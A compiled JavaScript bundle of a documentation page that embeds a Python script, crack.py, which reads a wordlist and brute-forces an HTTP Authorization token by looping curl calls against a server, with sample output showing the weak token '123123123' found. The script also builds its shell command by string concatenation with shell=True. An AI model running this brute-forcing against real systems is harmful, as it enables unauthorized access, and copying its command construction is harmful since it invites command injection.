(window.webpackJsonp=window.webpackJsonp||[]).push([[14],{148:function(e,n,r){"use strict";r.r(n),r.d(n,"frontMatter",(function(){return s})),r.d(n,"metadata",(function(){return i})),r.d(n,"rightToc",(function(){return c})),r.d(n,"default",(function(){return u}));var t=r(2),a=r(9),o=(r(0),r(186)),s={},i={id:"scripts/python_scripts",title:"python_scripts",description:"Run shell programs by reading commandline arguments",source:"@site/docs\\scripts\\python_scripts.md",permalink:"/rosh/docs/scripts/python_scripts"},c=[{value:"Run shell programs by reading commandline arguments",id:"run-shell-programs-by-reading-commandline-arguments",children:[]}],p={rightToc:c};function u(e){var n=e.components,r=Object(a.a)(e,["components"]);return Object(o.b)("wrapper",Object(t.a)({},p,r,{components:n,mdxType:"MDXLayout"}),Object(o.b)("h2",{id:"run-shell-programs-by-reading-commandline-arguments"},"Run shell programs by reading commandline arguments"),Object(o.b)("p",null,"This script reads different tokens from a file and pass them to curl command to find out the valid token for authorization"),Object(o.b)("pre",null,Object(o.b)("code",Object(t.a)({parentName:"pre"},{className:"language-python"}),'import subprocess\nimport argparse\n\ndef crack(filename, ip_addr) :\n\n  with open(filename) as f:\n    password_list = f.readlines()\n  \n  # to remove whitespace characters like `\\n` at the end of each line\n  password_list = [x.strip() for x in password_list]  \n\n  print(password_list)\n\n  for password in password_list :\n    comd = "curl -s -H \'Authorization: Token " + password + "\' " + ip_addr  \n    print("Trying..." + password)\n    output = subprocess.run(comd, capture_output=True, shell=True).stdout.decode(\'utf-8\')\n\n    if "Unauth".lower() in output.lower():\n      print("Unauth".lower()+"--\x3e" + output.lower())\n      continue\n    else :\n      print("Found : " + password)\n      break\n\nif __name__ == "__main__":\n  parser = argparse.ArgumentParser()\n  parser.add_argument("filename", help="Enter the filename containing passwords")\n  parser.add_argument("ip_addr", help="Enter the IP address of server including http://")\n\n  args = parser.parse_args()\n  crack(args.filename, args.ip_addr)\n')),Object(o.b)("p",null,"Output"),Object(o.b)("pre",null,Object(o.b)("code",Object(t.a)({parentName:"pre"},{className:"language-sh"}),"$ python3 crack.py /root/wordlists/100-common-passwords.txt http://192.107.107.3\nTrying...damian\nunauth--\x3eunauthorized access\nTrying...123123123\nFound : 123123123\n")))}u.isMDXComponent=!0},186:function(e,n,r){"use strict";r.d(n,"a",(function(){return l})),r.d(n,"b",(function(){return f}));var t=r(0),a=r.n(t);function o(e,n,r){return n in e?Object.defineProperty(e,n,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[n]=r,e}function s(e,n){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var t=Object.getOwnPropertySymbols(e);n&&(t=t.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),r.push.apply(r,t)}return r}function i(e){for(var n=1;n<arguments.length;n++){var r=null!=arguments[n]?arguments[n]:{};n%2?s(Object(r),!0).forEach((function(n){o(e,n,r[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):s(Object(r)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(r,n))}))}return e}function c(e,n){if(null==e)return{};var r,t,a=function(e,n){if(null==e)return{};var r,t,a={},o=Object.keys(e);for(t=0;t<o.length;t++)r=o[t],n.indexOf(r)>=0||(a[r]=e[r]);return a}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(t=0;t<o.length;t++)r=o[t],n.indexOf(r)>=0||Object.prototype.propertyIsEnumerable.call(e,r)&&(a[r]=e[r])}return a}var p=a.a.createContext({}),u=function(e){var n=a.a.useContext(p),r=n;return e&&(r="function"==typeof e?e(n):i(i({},n),e)),r},l=function(e){var n=u(e.components);return a.a.createElement(p.Provider,{value:n},e.children)},d={inlineCode:"code",wrapper:function(e){var n=e.children;return a.a.createElement(a.a.Fragment,{},n)}},m=a.a.forwardRef((function(e,n){var r=e.components,t=e.mdxType,o=e.originalType,s=e.parentName,p=c(e,["components","mdxType","originalType","parentName"]),l=u(r),m=t,f=l["".concat(s,".").concat(m)]||l[m]||d[m]||o;return r?a.a.createElement(f,i(i({ref:n},p),{},{components:r})):a.a.createElement(f,i({ref:n},p))}));function f(e,n){var r=arguments,t=n&&n.mdxType;if("string"==typeof e||t){var o=r.length,s=new Array(o);s[0]=m;var i={};for(var c in n)hasOwnProperty.call(n,c)&&(i[c]=n[c]);i.originalType=e,i.mdxType="string"==typeof e?e:t,s[1]=i;for(var p=2;p<o;p++)s[p]=r[p];return a.a.createElement.apply(null,s)}return a.a.createElement.apply(null,r)}m.displayName="MDXCreateElement"}}]);